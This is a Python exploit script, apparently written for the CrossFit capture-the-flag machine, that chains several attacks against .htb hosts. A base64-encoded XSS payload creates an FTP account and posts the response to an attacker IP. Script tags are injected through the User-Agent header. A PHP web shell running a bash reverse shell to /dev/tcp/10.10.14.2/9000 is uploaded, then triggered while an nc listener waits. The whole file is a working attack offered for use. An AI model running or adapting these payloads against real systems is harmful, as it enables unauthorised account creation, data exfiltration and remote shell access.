import urllib3
import os, subprocess
import requests
import base64
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.Session()

url = 'http://gym-club.crossfit.htb/blog-single.php'

xssFile = "ZnVuY3Rpb24gZ2V0X3Rva2VuKGJvZHkpIHsgdmFyIGRvbSA9IG5ldyBET01QYXJzZXIoKS5wYXJzZUZyb21TdHJpbmcoYm9keSwgInRleHQvaHRtbCIpOyByZXR1cm4gZG9tLmdldEVsZW1lbnRzQnlOYW1lKCJfdG9rZW4iKVswXS52YWx1ZTt9IHZhciBmZXRjaF9yZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsgZmV0Y2hfcmVxLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgeyBpZiAoZmV0Y2hfcmVxLnJlYWR5U3RhdGUgPT0gWE1MSHR0cFJlcXVlc3QuRE9ORSkgeyB2YXIgdG9rZW4gPSBnZXRfdG9rZW4oZmV0Y2hfcmVxLnJlc3BvbnNlKTsgdmFyIHJlZ19yZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsgcmVnX3JlcS5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpIHsgaWYgKHJlZ19yZXEucmVhZHlTdGF0ZSA9PSBYTUxIdHRwUmVxdWVzdC5ET05FKSB7IHZhciBleGZpbF9yZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsgZXhmaWxfcmVxLm9wZW4oIlBPU1QiLCAiaHR0cDovLzEwLjEwLjE0LjI6MzAwMC8iLCBmYWxzZSk7IGV4ZmlsX3JlcS5zZW5kKHJlZ19yZXEucmVzcG9uc2UpOyAgfSB9OyByZWdfcmVxLm9wZW4oIlBPU1QiLCAiaHR0cDovL2Z0cC5jcm9zc2ZpdC5odGIvYWNjb3VudHMiLCBmYWxzZSk7IHJlZ19yZXEud2l0aENyZWRlbnRpYWxzID0gdHJ1ZTsgcmVnX3JlcS5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LXR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7ICAgICAgICByZWdfcmVxLnNlbmQoIl90b2tlbj0iICsgdG9rZW4gKyAiJnVzZXJuYW1lPWJpZG8mcGFzcz1iaWRvMTIzNDUiKTsgICAgfX07IGZldGNoX3JlcS5vcGVuKCJHRVQiLCAiaHR0cDovL2Z0cC5jcm9zc2ZpdC5odGIvYWNjb3VudHMvY3JlYXRlIiwgZmFsc2UpOyBmZXRjaF9yZXEud2l0aENyZWRlbnRpYWxzID0gdHJ1ZTsgZmV0Y2hfcmVxLnNlbmQoKTs="

content = base64.b64decode(xssFile)

f = open("create-account.js", "w")
f.write(content.decode())
f.close()

data = {
    'name':'bido',
    'email':'bido@crossfit.htb',
    'phone':'9999999999',
    'message':'<script src="http://10.10.14.2"></script>',
    'submit':'submit'
}

headers = {'User-Agent':'<script src="http://10.10.14.2/create-account.js"></script>'}

http_server = subprocess.Popen(["python3","-m","http.server", "80"])

print("[+] Created user bido:bido12345 on FTP")
session.post(url, verify=False, proxies=proxies, data=data, headers=headers)

time.sleep(1)

print("[+] Uploading webshell to FTP")
webshell = open("webshell.php", "w")
content = "<?php system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.2/9000 0>&1'\"); ?>"
webshell.write(content)
webshell.close()

execstr = ('lftp -c \"\nset ssl:verify-certificate no\nopen ftp.crossfit.htb\nuser bido bido12345\ncd development-test\nput webshell.php\"')
os.system(execstr)

print("[+] Creating javascript file to trigged by XSS")
scriptWebShell = open("webshell.js", "w")
content = "document.location = 'http://development-test.crossfit.htb/webshell.php';"
scriptWebShell.write(content)
scriptWebShell.close()

print("[+] Triggering")
headersWebShell = {'User-Agent':'<script src="http://10.10.14.2/webshell.js"></script>'}

nc_listener = subprocess.Popen(["nc","-nvlp","9000"])
session.post(url, verify=False, proxies=proxies, data=data, headers=headersWebShell)

# http_server.wait()
nc_listener.wait()